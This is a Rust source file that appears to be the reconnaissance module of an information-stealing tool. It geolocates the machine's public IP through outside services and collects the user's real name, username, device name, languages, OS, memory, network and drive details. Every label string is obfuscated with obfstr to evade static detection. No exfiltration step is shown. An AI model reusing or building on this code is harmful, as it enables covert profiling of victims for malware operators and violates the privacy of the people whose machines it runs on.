use sysinfo::{System, SystemExt, DiskExt,NetworkExt};
use whoami;
use ureq;
use obfstr::obfstr;

fn gethttp(url:&str)->String
{
match ureq::get(url).call()
{
    Ok(r)=>{match r.into_string()
    {
        Ok(r)=>return r,//println!("{}",r),
        Err(_)=>String::new()
    }},
    Err(_)=>String::new()
}
}

pub fn sysinfos()->Vec<String>
{  
    let ip = gethttp("https://ipecho.net/plain");
    let country = gethttp(format!("https://ipapi.co/{}/country",ip).as_str());
    let city = gethttp(format!("https://ipapi.co/{}/city",ip).as_str());
    let mut info:Vec<String> = Vec::new();
    let mut sys = System::new_all();

    sys.refresh_all();

    
    info.push(format!("{}",obfstr!("\n 👤  => USER INFORMATIONS <=")));
    info.push(format!("{}{}",obfstr!("Full Name           : ") ,whoami::realname(),));
    info.push(format!("{}{}/{}", obfstr!("Username           : "),whoami::username(),whoami::devicename()));
    info.push(format!("{}{:?}",obfstr!("Languages          : "),whoami::lang().collect::<Vec<String>>()));
    info.push(format!("{} {}",obfstr!("IP                          :"),ip));
    info.push(format!("{}{}",obfstr!("Country               : "),country));
    info.push(format!("{} {}",obfstr!("City                       :"),city));
    info.push(format!("{}",obfstr!("\n 💻  => MACHINE INFORMATIONS <=")));//+network
    info.push(format!("{} {} {}", obfstr!("OS                       :"),whoami::distro(),whoami::arch()));
    info.push(format!("{} {}",obfstr!("CPUs                   :"), sys.cpus().len()));
    info.push(format!("{} {} {}",obfstr!("Total RAM          :"), sys.total_memory()/1024/1024,obfstr!("GB")));
    info.push(format!("{} {} {}",obfstr!("Used RAM          :"), sys.used_memory()/1024/1024,obfstr!("GB")));
    info.push(format!("{} {} {}",obfstr!("TOTAL SWAP      :"), sys.total_swap()/1024/1024,obfstr!("GB")));
    info.push(format!("{} {} {}",obfstr!("Used SWAP        :"), sys.used_swap()/1024/1024,obfstr!("GB")));
    
    for (inter, data) in sys.networks() 
    {
        let output = format!("{}           : {}/{} B",inter,data.received(),data.transmitted());
        info.push(output);
    }

    info.push(format!("{}",obfstr!("\n   💾=>DRIVES <=")));
    for disk in sys.disks() 
    {
        info.push(format!("{} {:?}",obfstr!("Disk                      :"),disk.mount_point()));
        info.push(format!("{} {:?}",obfstr!("Type                     :"), disk.kind()));
        info.push(format!("{} {:?} GB",obfstr!("Total Space         :"), disk.total_space()/1024/1024/1024));
        info.push(format!("{} {:?} GB\n",obfstr!("Available Space  :"), disk.available_space()/1024/1024/1024));
    }

   return info;

}

pub fn get_drives()->Vec<String>
{
    let  mut sys = System::new_all();
    sys.refresh_disks_list();
    let mut drives: Vec<String> = vec![];
     
     
    for disk in sys.disks() 
    {
        drives.push(disk.mount_point().display().to_string());
    }

    return drives;
}